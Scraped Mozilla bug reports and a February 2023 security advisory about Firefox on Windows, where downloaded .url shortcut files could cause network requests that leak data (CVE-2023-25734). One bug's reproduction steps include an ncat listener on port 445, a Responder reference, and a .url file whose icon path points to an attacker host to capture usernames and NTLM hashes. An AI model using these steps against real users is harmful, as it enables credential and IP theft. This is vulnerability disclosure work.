| [poc.html](/attachment.cgi?id=9312178)  [2 years ago](#c0)  [Shaheen Fazim](/user_profile?user_id=720428)   4.96 KB, text/html |  | [Details](/attachment.cgi?id=9312178&action=edit) |
| --- | --- | --- |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Shaheen Fazim](/user_profile?user_id=720428)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1810143#c0)• 2 years ago |
|  | |

Attached file
[poc.html](attachment.cgi?id=9312178)
— [Details](attachment.cgi?id=9312178&action=edit)

In Firefox it has implemented a security measure to protect users by replacing the download of ".lnk" files with ".download" extension. However, there is another file extension that is considered to be more severe than ".lnk", which is the ".url" extension.

A ".url" file, also known as a URL shortcut, is a type of link file that points to a web page or other resource on the internet. These files can be created by the user or by an application, and can be used to quickly access a specific webpage. However, if a ".url" file is maliciously created by an attacker, it can contain a script or other code that will execute automatically when the file is opened. This can lead to the execution of malware, the stealing of personal information, or other malicious activity.

hence made a POC which uses this method by convincing the user to save and upload the saved file for data exfiltration.

Flags: sec-bounty?

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1810143#a2160_159069)• 2 years ago |

Status: UNCONFIRMED → RESOLVEDClosed: 2 years agoDuplicate of bug: [CVE-2023-25734](/show_bug.cgi?id=1809923 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read")Resolution: --- → DUPLICATE

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1810143#a363184_1689)• 2 years ago |

Flags: sec-bounty? → sec-bounty-See Also: → <https://bugs.chromium.org/p/chromium/issues/detail?id=1307930>

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1810143#c2)• 2 years ago |
|  | |

Congratulations, we have awarded a bug bounty for this issue. The award is split with [bug 1809923](/show_bug.cgi?id=1809923 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read") since it was filed within the "collision window" defined in our bug bounty policy.

Flags: sec-bounty- → sec-bounty+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1810143#a1748014_75935)• 2 years ago |

Group: firefox-core-security → core-security-release

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1810143#a25069085_1689)• 1 year ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1810143#a43472584_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1810143&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Shaheen Fazim](/user_profile?user_id=720428)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_ecd4389d_20250115_085145.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2023-06

## Security Vulnerabilities fixed in Firefox ESR 102.8

Announced
February 14, 2023
Impact
high
Products
Firefox ESR
Fixed in

* Firefox ESR 102.8

#### [#CVE-2023-25728: Content security policy leak in violation reports using iframes](#CVE-2023-25728)

Reporter
Johan Carlsson
Impact
high
##### Description

The `Content-Security-Policy-Report-Only` header could allow an attacker to leak a child iframe's unredacted URI when interaction with that iframe triggers a redirect.

##### References

* [Bug 1790345](https://bugzilla.mozilla.org/show_bug.cgi?id=1790345)

#### [#CVE-2023-25730: Screen hijack via browser fullscreen mode](#CVE-2023-25730)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A background script invoking `requestFullscreen` and then blocking the main thread could force the browser into fullscreen mode indefinitely, resulting in potential user confusion or spoofing attacks.

##### References

* [Bug 1794622](https://bugzilla.mozilla.org/show_bug.cgi?id=1794622)

#### [#CVE-2023-0767: Arbitrary memory write via PKCS 12 in NSS](#CVE-2023-0767)

Reporter
Christian Holler
Impact
high
##### Description

An attacker could construct a PKCS 12 cert bundle in such a way that could allow for arbitrary memory writes via PKCS 12 Safe Bag attributes being mishandled.

##### References

* [Bug 1804640](https://bugzilla.mozilla.org/show_bug.cgi?id=1804640)

#### [#CVE-2023-25735: Potential use-after-free from compartment mismatch in SpiderMonkey](#CVE-2023-25735)

Reporter
Samuel Groß
Impact
high
##### Description

Cross-compartment wrappers wrapping a scripted proxy could have caused objects from other compartments to be stored in the main compartment resulting in a use-after-free after unwrapping the proxy.

##### References

* [Bug 1810711](https://bugzilla.mozilla.org/show_bug.cgi?id=1810711)

#### [#CVE-2023-25737: Invalid downcast in SVGUtils::SetupStrokeGeometry](#CVE-2023-25737)

Reporter
Lukas Bernhard
Impact
high
##### Description

An invalid downcast from `nsTextNode` to `SVGElement` could have lead to undefined behavior.

##### References

* [Bug 1811464](https://bugzilla.mozilla.org/show_bug.cgi?id=1811464)

#### [#CVE-2023-25738: Printing on Windows could potentially crash Firefox with some device drivers](#CVE-2023-25738)

Reporter
Mark
Impact
high
##### Description

Members of the `DEVMODEW` struct set by the printer device driver weren't being validated and could have resulted in invalid values which in turn would cause the browser to attempt out of bounds access to related variables.
*This bug only affects Firefox on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1811852](https://bugzilla.mozilla.org/show_bug.cgi?id=1811852)

#### [#CVE-2023-25739: Use-after-free in mozilla::dom::ScriptLoadContext::~ScriptLoadContext](#CVE-2023-25739)

Reporter
Holger Fuhrmannek
Impact
high
##### Description

Module load requests that failed were not being checked as to whether or not they were cancelled causing a use-after-free in `ScriptLoadContext`.

##### References

* [Bug 1811939](https://bugzilla.mozilla.org/show_bug.cgi?id=1811939)

#### [#CVE-2023-25729: Extensions could have opened external schemes without user knowledge](#CVE-2023-25729)

Reporter
Vitor Torres
Impact
moderate
##### Description

Permission prompts for opening external schemes were only shown for `ContentPrincipals` resulting in extensions being able to open them without user interaction via `ExpandedPrincipals`. This could lead to further malicious actions such as downloading files or interacting with software already installed on the system.

##### References

* [Bug 1792138](https://bugzilla.mozilla.org/show_bug.cgi?id=1792138)

#### [#CVE-2023-25732: Out of bounds memory write from EncodeInputStream](#CVE-2023-25732)

Reporter
Ronald Crane
Impact
moderate
##### Description

When encoding data from an `inputStream` in `xpcom` the size of the input being encoded was not correctly calculated potentially leading to an out of bounds memory write.

##### References

* [Bug 1804564](https://bugzilla.mozilla.org/show_bug.cgi?id=1804564)

#### [#CVE-2023-25734: Opening local .url files could cause unexpected network loads](#CVE-2023-25734)

Reporter
Ameen Basha M K and Shaheen Fazim
Impact
moderate
##### Description

After downloading a Windows `.url` shortcut from the local filesystem, an attacker could supply a remote path that would lead to unexpected network requests from the operating system. This also had the potential to leak NTLM credentials to the resource.
*This bug only affects Firefox on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1809923](https://bugzilla.mozilla.org/show_bug.cgi?id=1809923)
* [Bug 1784451](https://bugzilla.mozilla.org/show_bug.cgi?id=1784451)
* [Bug 1810143](https://bugzilla.mozilla.org/show_bug.cgi?id=1810143)
* [Bug 1812338](https://bugzilla.mozilla.org/show_bug.cgi?id=1812338)

#### [#CVE-2023-25742: Web Crypto ImportKey crashes tab](#CVE-2023-25742)

Reporter
Goras Francesco
Impact
low
##### Description

When importing a SPKI RSA public key as ECDSA P-256, the key would be handled incorrectly causing the tab to crash.

##### References

* [Bug 1813424](https://bugzilla.mozilla.org/show_bug.cgi?id=1813424)

#### [#CVE-2023-25744: Memory safety bugs fixed in Firefox 110 and Firefox ESR 102.8](#CVE-2023-25744)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Kershaw Chang and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 109 and Firefox ESR 102.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 110 and Firefox ESR 102.8](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1789449%2C1803628%2C1810536)

#### [#CVE-2023-25746: Memory safety bugs fixed in Firefox ESR 102.8](#CVE-2023-25746)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Philipp and Gabriele Svelto reported memory safety bugs present in Firefox ESR 102.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox ESR 102.8](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1544127%2C1762368)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_2e608270_20250115_085134.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1784451)
* [XML](/show_bug.cgi?ctype=xml&id=1784451)

Closed
[Bug 1784451](/show_bug.cgi?id=1784451)

Opened 2 years ago
Closed 2 years ago

# URL files on windows should be flagged as potentially malicious

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

URL files on windows should be flagged as potentially malicious

## Categories

### (Toolkit :: Safe Browsing, enhancement)

[Product:](/describecomponents.cgi?product=Toolkit)

Toolkit
▾

Toolkit
The Mozilla Toolkit is a set of APIs, built on top of Gecko, which provide advanced services to XUL applications. These services include Profile Management, Chrome Registration, Browsing History, Extension and Theme Management, Application Update Service, and Safe Mode. ([More info](https://wiki.mozilla.org/Modules/Toolkit))
[See Open Bugs in This Product](/buglist.cgi?product=Toolkit&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Toolkit)
Watch This Product

[Component:](/describecomponents.cgi?product=Toolkit&component=Safe%20Browsing#Safe%20Browsing)

Safe Browsing
▾

Toolkit :: Safe Browsing
Safe Browsing UI and service (includes phishing protection).
[See Open Bugs in This Component](/buglist.cgi?product=Toolkit&component=Safe%20Browsing&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Toolkit&component=Safe%20Browsing&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Toolkit&component=Safe%20Browsing)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

Firefox 103

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

enhancement

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

--

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
DUPLICATE
of [bug 1809923](/show_bug.cgi?id=1809923 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read")

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

DUPLICATE

of

Mark as Duplicate

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

---

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Accessibility Severity | --- |
| --- | --- |
| a11y-review | --- |
| Performance Impact | --- |
| Webcompat Score | --- |
| Webcompat Priority | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: bugzilla\_mozilla\_org, Unassigned)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

*Unassigned*

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/a04c907b5fc2922b7b5b54ab2ee24886?d=mm&size=40)  [bugzilla\_mozilla\_org](/user_profile?user_id=711667)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/bd10912fd8637cc64f00edd465ca8b0d?d=mm&size=40)  [dimi](/user_profile?user_id=468232)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

*Nobody*

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[CVE-2023-25734](/show_bug.cgi?id=1809923 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read")

## Details

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

---

[Keywords:](/describekeywords.cgi)

---

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

---

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Mae](/user_profile?user_id=711667)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1784451#c0)• 2 years ago |
|  | |

Steps to reproduce:

1. Open a listener on port 445(smb) anywhere on the internet. A simple `ncat -lvp 445` is enough for obtaining a real IP address bypassing browser's proxy settings(impacts tor browser), although responder(<https://github.com/lgandx/Responder>) can also be used to grab more data about the user including arbitrary environment variables, the real username and the NTLM password hash.
2. Create a file with an url extension containing the following contents and host it anywhere on the web(replacing x.x.x.x with the ip of the listener created in the previous step).

```
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\x.x.x.x\%USERNAME%.icon
IconIndex=1

```

3. Download the file created in the previous step.

Actual results:

Firefox downloaded the file. If you were to open the downloads directory in windows file explorer it would send out a ping to the server containing a lot of potentially sensitive data.

Expected results:

Firefox should have flagged the file as potentially malicious and not downloaded it automatically even with `browser.download.always_ask_before_handling_new_types` set to false.

This is the behavior of the chromium browser(<https://bugs.chromium.org/p/chromium/issues/detail?id=335029>)

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1784451#a15052667_406194)• 2 years ago |

See Also: → [CVE-2023-25734](/show_bug.cgi?id=1809923 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read")

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1784451#c1)• 2 years ago |
|  | |

This was fixed in [bug 1809923](/show_bug.cgi?id=1809923 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read"). Sorry we didn't notice this one... "SafeBrowsing" isn't the feature that controls this.

Status: UNCONFIRMED → RESOLVEDClosed: 2 years agoDuplicate of bug: [CVE-2023-25734](/show_bug.cgi?id=1809923 "VERIFIED FIXED - .url extension Download leads to Arbitrary File Read")Resolution: --- → DUPLICATE
You need to [log in](/show_bug.cgi?id=1784451&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑


